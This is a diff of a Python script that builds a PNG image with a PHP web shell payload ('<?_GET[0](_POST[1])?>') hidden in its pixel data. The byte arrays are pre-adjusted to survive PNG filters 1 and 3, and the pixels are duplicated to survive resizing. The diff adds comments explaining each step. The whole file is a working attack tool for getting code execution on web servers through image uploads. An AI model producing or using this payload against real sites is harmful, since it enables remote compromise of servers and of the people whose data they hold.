@@ -3,7 +3,11 @@
 # pip install numpy
 # pip install imageio
 
-import sys
+import imageio
+import numpy as np
+
+
+# Payloads containing <?_GET[0](_POST[1])?> :
 
 p1 = [0xa3, 0x9f, 0x67, 0x54, 0x6f, 0x2c, 0x24, 0x15, 0x2b, 0x11, 0x67, 0x12,
 	0x54, 0x6f, 0x11, 0x2e, 0x29, 0x15, 0x2b, 0x21, 0x67, 0x22, 0x6b, 0x6f,
@@ -21,37 +25,33 @@ p3 = [0xa3, 0x9f, 0x67, 0x54, 0x6f, 0x2c, 0x24, 0x15, 0x2b, 0x11, 0x67, 0x12,
 
 n = len(p1)
 
+
+# Bypassing PNG filters:
 for i in range(n - 3):
-	p1[i+3] = (p1[i+3] + p1[i]) % 256
-	p3[i+3] = (p3[i+3] + int(p3[i]/2)) % 256
+	p1[i+3] = (p1[i+3] + p1[i]) % 256  # Filter 1
+	p3[i+3] = (p3[i+3] + int(p3[i]/2)) % 256 # Filter 3
 
+
+# Final payload
 p = p1 + p3
-
-#for i in range(n):
-#	print(hex(p1[i]))
-#
-#print("")
-#
-#for i in range(n):
-#	print(hex(p3[i]))
+n = len(p)
 
 
-import imageio
-import numpy as np
-
+# Creating the PNG file as a black square:
 imageio.imwrite('pld.png', np.zeros((110,110,3)))
 img = imageio.imread('pld.png')
 imageio.imwrite('pld.png', img)
-
 img = imageio.imread('pld.png')
 
-n = len(p)
 
+# Inserting the payload in the image:
 for i in range(0,n,3):
+	# Payload pixel
 	r = p[i]
 	g = p[i+1]
 	b = p[i+2]
 	color = [r,g,b]
+	# Replicated to overcome resising
 	img[0][int(i/3)*2] = color
 	img[0][int(i/3)*2+1] = color
 	img[1][int(i/3)*2] = color
